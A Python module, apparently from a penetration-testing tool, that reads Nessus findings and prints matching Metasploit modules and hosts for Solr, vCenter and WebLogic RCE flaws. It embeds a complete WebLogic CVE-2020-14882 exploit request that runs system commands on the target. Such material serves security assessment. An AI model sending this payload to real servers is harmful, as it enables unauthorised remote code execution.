from src.utilities.utilities import find_scan
from src.modules.nv_parse import GroupNessusScanOutput
from src.utilities import logger
from src.solvers.solverclass import BaseSolverClass

class ActionablesSolverClass(BaseSolverClass):
    def __init__(self) -> None:
        super().__init__("Actionables", 0)

    def solve(self, args):
        self._get_hosts(args) # type: ignore
        if not self.hosts:
            return
        if self.is_nv:
            hosts = self.subhosts.get("Apache Solr Config API Velocity Template RCE (Direct Check)", [])
            if hosts:
                print("metasploit: use exploit/multi/http/solr_velocity_rce")
                for host in hosts:
                    print(host)
            hosts = self.subhosts.get("VMware vCenter Server Virtual SAN Health Check plug-in RCE (CVE-2021-21985) (direct check)", [])
            if hosts:
                print("metasploit: use exploit/linux/http/vmware_vcenter_vsan_health_rce")
                for host in hosts:
                    print(host)
            hosts = self.subhosts.get("Oracle WebLogic Server RCE (CVE-2020-14882)", [])
            if hosts:
                print("metasploit: use exploit/multi/http/weblogic_admin_handle_rce")
                print("""
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: 129.1.2.82:7102
Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Content-Length: 1189
User-Agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Pragma: no-cache
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", "ipconfig"} : new String[]{"/bin/sh", "-c", "id"};
String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
res.getServletOutputStream().flush();
res.getWriter().write("");
executeThread.interrupt();
");""")
                for host in hosts:
                    print(host)

